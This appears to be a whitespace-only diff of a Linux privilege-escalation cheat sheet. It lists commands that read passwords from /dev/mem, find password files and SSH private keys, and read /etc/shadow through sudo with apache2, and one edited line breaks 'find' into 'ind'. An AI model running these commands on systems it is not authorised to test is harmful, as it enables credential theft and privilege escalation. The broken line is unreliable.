@@ -74,30 +74,30 @@
  
  Files that were edited in the last 10 minutes
                             
-    find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+    ind / -mmin -10 2>/dev/null | grep -Ev "^/proc"
           
           
          
  In memory passwords 
                 
-     strings /dev/mem -n10 | grep -i PASS
+   strings /dev/mem -n10 | grep -i PASS
 
 
 Find sensitive files
                
-     locate password | more           
-     /boot/grub/i386-pc/password.mod
-     /etc/pam.d/common-password
-     /etc/pam.d/gdm-password
-     /etc/pam.d/gdm-password.original
-     /lib/live/config/0031-root-password
+    locate password | more           
+    /boot/grub/i386-pc/password.mod
+    /etc/pam.d/common-password
+    /etc/pam.d/gdm-password
+    /etc/pam.d/gdm-password.original
+    /lib/live/config/0031-root-password
 
 
 
 SSH Key
                         
-     find / -name authorized_keys 2> /dev/null
-     find / -name id_rsa 2> /dev/null
+    find / -name authorized_keys 2> /dev/null
+    find / -name id_rsa 2> /dev/null
 
 
 
@@ -145,9 +145,9 @@ There are many scripts that you can execute on a linux machine which automatical
  
   Enumeration
    
-            sudo -l
-            sudo --version
-            sudo apache2 -f /etc/shadow
+     sudo -l
+     sudo --version
+     sudo apache2 -f /etc/shadow
                  
                  
 		 
